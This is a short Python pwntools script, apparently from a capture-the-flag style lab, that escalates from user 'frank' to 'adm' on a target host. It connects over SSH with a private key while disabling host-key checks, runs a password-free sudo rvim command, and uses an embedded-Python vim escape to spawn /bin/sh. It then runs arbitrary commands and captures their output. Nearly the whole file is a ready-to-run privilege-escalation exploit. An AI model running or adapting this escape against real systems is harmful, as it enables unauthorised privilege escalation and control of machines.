#!/usr/bin/env python3
"""
rvim_escape.py - frank -> adm

frank may run `sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c`
without a password. rvim blocks :! and :sh, but vimscript can hand off to
an embedded interpreter. This vim has +python/dyn, so we run a one-liner
that replaces the vim process with /bin/sh.
"""
import sys
import time

from pwn import *  # noqa: F403

context.log_level = "error"

KEY = "/root/.ssh/id_ed25519"
USER_HOST = "frank@10.129.63.36"
STYLE = {
    "argv": [
        "ssh", "-tt", "-i", KEY,
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        USER_HOST,
    ]
}

PY_ESCAPE = b':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
SH_ESCAPE = b':sh'


def spawn_pty():
    return process(STYLE["argv"], stdin=PTY, stdout=PTY)


def main() -> None:
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id; hostname"
    p = spawn_pty()
    time.sleep(1.5)
    p.sendline(b"sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c")
    time.sleep(3.0)  # let vim paint its screen
    p.sendline(PY_ESCAPE)
    time.sleep(2.5)  # python handoff -> sh
    p.sendline((cmd + "; echo __ADM_DONE__").encode())
    try:
        out = p.recvuntil(b"__ADM_DONE__", timeout=12)
        sys.stdout.buffer.write(out)
    except Exception as e:
        print(f"recv issue: {e!r}", file=sys.stderr)
        p.close()
        return
    p.close()


if __name__ == "__main__":
    main()
